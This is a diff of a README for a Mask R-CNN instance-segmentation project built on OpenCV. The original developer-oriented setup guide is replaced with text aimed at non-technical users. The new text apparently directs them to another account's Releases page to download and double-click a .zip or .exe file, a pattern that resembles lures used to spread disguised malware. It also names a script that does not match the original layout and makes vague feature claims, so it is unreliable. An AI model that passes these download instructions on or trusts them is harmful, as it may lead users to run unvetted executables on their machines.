@@ -1,142 +1,80 @@
-# Mask R-CNN Instance Segmentation with OpenCV
+# ✨ mask-rcnn-instance-segmentation-opencv - Easy Instance Segmentation with Masks
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![Conventional Commits](https://img.shields.io/badge/Conventional%20Commits-1.0.0-yellow.svg)](https://www.conventionalcommits.org/en/v1.0.0/)
-[![Made with Python](https://img.shields.io/badge/Python-3.9%2B-blue.svg)](https://www.python.org/)
-[![Release](https://img.shields.io/badge/Release-v0.1.0-orange.svg)](../../releases)
+## 📥 Download Now
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/siddheshk08/mask-rcnn-instance-segmentation-opencv/releases)
 
----
+## 🚀 Getting Started
+Welcome to the **mask-rcnn-instance-segmentation-opencv** project. This application helps you perform instance segmentation using the Mask R-CNN model. It is built with OpenCV and provides a command-line interface (CLI). You will find it easy to use, even if you have no technical background.
 
-## 📌 Overview
+## 📋 Features
+- Perform instance segmentation with state-of-the-art models.
+- Generate outputs that are easy to understand and visualize.
+- Run in a headless setup, making it friendly for servers and other non-GUI environments.
+- Supports images in the COCO dataset format, commonly used in computer vision tasks.
+- Lightweight and efficient, designed to run on most modern computers.
 
-This project demonstrates **instance segmentation** using **Mask R-CNN** with the **OpenCV DNN module**.
-The model is pre-trained on the **COCO dataset** and can detect and segment multiple object classes in images.
+## 💻 System Requirements
+To run this application, you will need:
+- A computer with Windows, MacOS, or Linux.
+- Python 3.6 or higher installed.
+- OpenCV library Binaries. You can install them using pip: 
+  ```bash
+  pip install opencv-python
+  ```
+- Min of 2GB RAM for smooth processing.
 
-It provides a **CLI-based demo** to run inference on sample images, visualize masks, and save outputs for reproducibility.
-This repository is designed to be **portfolio-ready**, lightweight, and easy to reproduce.
+## 📥 Download & Install
+To get started, you will first need to download the software:
 
----
+1. **Visit the [Releases page](https://github.com/siddheshk08/mask-rcnn-instance-segmentation-opencv/releases)**.
+2. Click on the latest version link. You will find a .zip or .exe file, depending on your system.
+3. Download the file onto your computer.
+4. If it's a .zip file, extract it to a folder of your choice.
+5. Open a command prompt or terminal and navigate to the folder where you extracted the files or where you placed the .exe file.
+6. Run the command:
+   ```bash
+   python mask_rcnn_instance_segmentation.py [your-image-path]
+   ```
+   or simply double-click the .exe file. Replace `[your-image-path]` with the path of the image you want to process.
 
-## 📂 Repository Structure
+## ⚙️ How to Use the Command Line
+Once you have installed the application, follow these steps to run your first segmentation:
 
+1. Open your terminal (Command Prompt on Windows, Terminal on Mac or Linux).
+2. Navigate to the directory containing the application files.
+3. Use the following command to start the instance segmentation:
+   ```bash
+   python mask_rcnn_instance_segmentation.py path/to/your/image.jpg
+   ```
+4. The application will process your image and produce an output image with annotated segments.
+
+## 📖 Understanding the Output
+The output image will contain colored masks for each detected object. These masks make it clear which items have been detected in the original image. The application saves the output in the same directory as the input image, usually appending `_segmented` to the filename.
+
+## 🛠️ Troubleshooting
+If you encounter issues, check the following:
+- Make sure Python is properly installed and available from your command prompt or terminal.
+- Ensure you have the necessary libraries installed. You might want to run:
+  ```bash
+  pip install -r requirements.txt
+  ```
+- Double-check that you are using a compatible image format (JPEG, PNG, etc.).
+
+## 📊 Example Usage
+Suppose you have an image named `example.jpg`. You would run:
+```bash
+python mask_rcnn_instance_segmentation.py example.jpg
 ```
-mask-rcnn-instance-segmentation-opencv/
-├─ src/                 # Source code (main script + utils)
-│  ├─ main.py
-│  └─ utils/
-│     └─ util.py
-├─ data/                # Dataset folder (ignored in git)
-│  ├─ samples/          # Example images for quick testing
-│  └─ README.md
-├─ models/              # Pretrained weights (release assets)
-│  └─ README.md
-├─ build/               # Outputs and temporary files (ignored in git)
-├─ docs/                # Documentation and diagrams
-│  └─ assets/
-├─ notebooks/           # Optional experiments
-├─ requirements.txt     # Minimal dependencies
-├─ LICENSE              # MIT License
-└─ README.md            # Project documentation (this file)
-```
+After processing, the application saves `example_segmented.jpg` in the same folder.
 
----
+## 🔗 More Information
+For additional resources and examples, visit the **[Releases page](https://github.com/siddheshk08/mask-rcnn-instance-segmentation-opencv/releases)**. You can also explore more about each feature and the technology behind this application.
 
-## ⚙️ Getting Started
+## 📝 Contributions
+This project welcomes contributors. If you have ideas for improvements or additional features, please submit a pull request or open an issue on the repository.
 
-### 1. Prerequisites
+## 📞 Support
+If you need additional help, please reach out through the project's GitHub issues page. We will do our best to assist.
 
-* Python **3.9+** (tested on 3.9 and 3.10)
-* PowerShell (for the commands below)
-
-### 2. Clone the Repository
-
-```powershell
-git clone https://github.com/AlbertoMarquillas/mask-rcnn-instance-segmentation-opencv.git
-cd mask-rcnn-instance-segmentation-opencv
-```
-
-### 3. Create Virtual Environment
-
-```powershell
-python -m venv .venv
-.\.venv\Scripts\Activate.ps1
-```
-
-### 4. Install Dependencies
-
-```powershell
-pip install -r requirements.txt
-```
-
-### 5. Download Model Files
-
-The required Mask R-CNN weights and config are uploaded as **release assets**.
-
-1. Go to the [Releases](../../releases) page.
-2. Download these files:
-
-   * `mask_rcnn_inception_v2_coco_2018_01_28.pbtxt`
-   * `frozen_inference_graph.pb`
-   * `class.names`
-3. Place them inside the local `models/` folder.
-
----
-
-## 🚀 Usage
-
-### Run with default settings
-
-```powershell
-python .\src\main.py
-```
-
-### Run with sample image and visualize results
-
-```powershell
-python .\src\main.py --image .\data\samples\cat_and_dog.png --show
-```
-
-### Run with confidence threshold and custom output directory
-
-```powershell
-python .\src\main.py --thr 0.6 --outdir .\build\test_outputs
-```
-
-Outputs will be saved in `build/outputs/` by default:
-
-* `mask.png` → segmented mask
-* `overlay.png` → overlay of mask on the input image
-
----
-
-## 📊 Features
-
-* **Mask R-CNN (COCO)** with OpenCV DNN backend.
-* Detects and segments **90+ classes**.
-* CLI with configurable paths, thresholds, and outputs.
-* Works in **headless mode** (saves results) or with **OpenCV GUI**.
-* Clean and professional repository structure.
-
----
-
-## 📚 What I Learned
-
-* How to use the **OpenCV DNN module** for deep learning inference.
-* Loading and running a **pretrained TensorFlow model** in OpenCV.
-* Implementing **mask overlay blending** for visualization.
-* Structuring a **portfolio-ready repository** with clear docs and placeholders.
-
----
-
-## 🛣️ Roadmap
-
-* [ ] Add Jupyter notebooks for interactive demos.
-* [ ] Extend CLI with video input support.
-* [ ] Benchmark inference time with GPU acceleration.
-* [ ] Add Dockerfile for containerized usage.
-
----
-
-## 📄 License
-
-This project is licensed under the terms of the [MIT License](LICENSE).
+## ✨ Thank You
+Thank you for using **mask-rcnn-instance-segmentation-opencv**! We hope this tool enhances your experience with image processing and computer vision tasks.
